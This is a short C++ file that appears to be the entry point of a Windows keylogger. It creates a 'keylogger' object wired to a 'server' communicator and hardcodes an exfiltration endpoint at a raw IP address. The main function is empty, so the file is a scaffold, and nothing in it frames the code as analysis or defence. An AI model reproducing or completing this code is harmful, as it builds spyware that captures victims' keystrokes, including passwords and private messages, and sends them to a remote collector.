#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <stdio.h>
#include <string>
#include <fstream>
#include "Communicator.h"
#include "Logger.h"

// statics
std::string ENDPOINT = "http://194.233.71.142/ll";

// instances
Communicator server;
Logger keylogger(server);
	
/// <summary>
/// The main entry point of the entire program.
/// </summary>
int WINAPI wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR pCmdLine,
	_In_ int nCmdShow) { 

}